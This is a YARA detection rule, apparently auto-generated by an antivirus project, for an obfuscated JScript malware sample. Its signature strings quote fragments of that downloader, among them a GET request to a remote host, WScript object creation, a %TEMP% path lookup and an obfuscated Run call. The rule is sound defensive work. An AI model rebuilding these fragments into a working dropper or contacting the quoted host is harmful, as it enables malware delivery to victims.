rule sig_20160428_740785bf51000209f656a2bd89478afa {
  meta:
    description = "datamaliciousorder - file 20160428_740785bf51000209f656a2bd89478afa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f2cbc84e5a044149442734c5290b54fca7d6e2aa003be052f7233d2b73c645d8"

  strings:
    $s1  = "EynUytWvqPahDwxVbcBjb[MkfVrtWucDjaHzhZceTai](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function RtnUfkYrjMpgBhlTvjWol(PgrRvbVskNxbCvpMowInh){CciCrsMvnCfzPzgMwvNjb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function ClzYqtMrsBoxRujZtnXcd() {return CciCrsMvnCfzPzgMwvNjb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return TmsRizDjkBxzDjpNneVlf - WmcDagPbvHacHgnBzyOtr;};" fullword ascii
    $s5  = "var CciCrsMvnCfzPzgMwvNjb = function AikJhgFnvFghJncXwzYag() {return QtiFkmGtuHtrPzgNxyXqq[QfiAplMtlHwqGndGoqVib](\"WScript\"+\"" ascii
    $s6  = "var CciCrsMvnCfzPzgMwvNjb = function AikJhgFnvFghJncXwzYag() {return QtiFkmGtuHtrPzgNxyXqq[QfiAplMtlHwqGndGoqVib](\"WScript\"+\"" ascii
    $s7  = "var QtiFkmGtuHtrPzgNxyXqq = this[\"WScript\"];" fullword ascii
    $s8  = "function RtnUfkYrjMpgBhlTvjWol(PgrRvbVskNxbCvpMowInh){CciCrsMvnCfzPzgMwvNjb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function ClzYqtMrsBoxRujZtnXcd() {return CciCrsMvnCfzPzgMwvNjb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function YdlLwmKziGslMpiBytPsh(){return 23;};" fullword ascii
    $s11 = "function CmyTsjGckIofOhiOwwWvb(){return ApoSnpSpvSbiEhpYjeCnu + \"\";};" fullword ascii
    $s12 = "function IvzGjbVfaBjgDysOenXoy(TmsRizDjkBxzDjpNneVlf, WmcDagPbvHacHgnBzyOtr){XzdQcaMqyGnaIcnRixXer = XzdQcaMqyGnaIcnRixXer * 1; " ascii
    $s13 = "if (EynUytWvqPahDwxVbcBjb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function JthWqkAqdUcvKirDhwBzl() {return ((YznTqsOtyBykEeiRnkLfb == true) && (YznTqsOtyBykEeiRnkLfb == VucNlrKapRjbZviQhrHft)) ?" ascii
    $s15 = "var MeiUmuQlwLjoNknWyhMkt = false;" fullword ascii
    $s16 = "YznTqsOtyBykEeiRnkLfb = true; " fullword ascii
    $s17 = "function NkcRaxBrcYnmSgoDfeRkz(PabWpvOngDayUlgAhvTua) {var TteAylEhlJgyJhlQdhIwj = (1, 2, 3, 4, 5, PabWpvOngDayUlgAhvTua); retur" ascii
    $s18 = "function IvzGjbVfaBjgDysOenXoy(TmsRizDjkBxzDjpNneVlf, WmcDagPbvHacHgnBzyOtr){XzdQcaMqyGnaIcnRixXer = XzdQcaMqyGnaIcnRixXer * 1; " ascii
    $s19 = "function KjxRhgUjeNtbDriHdsRtv()" fullword ascii
    $s20 = "var CeeNdgJrqPptVlgZaqArj = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}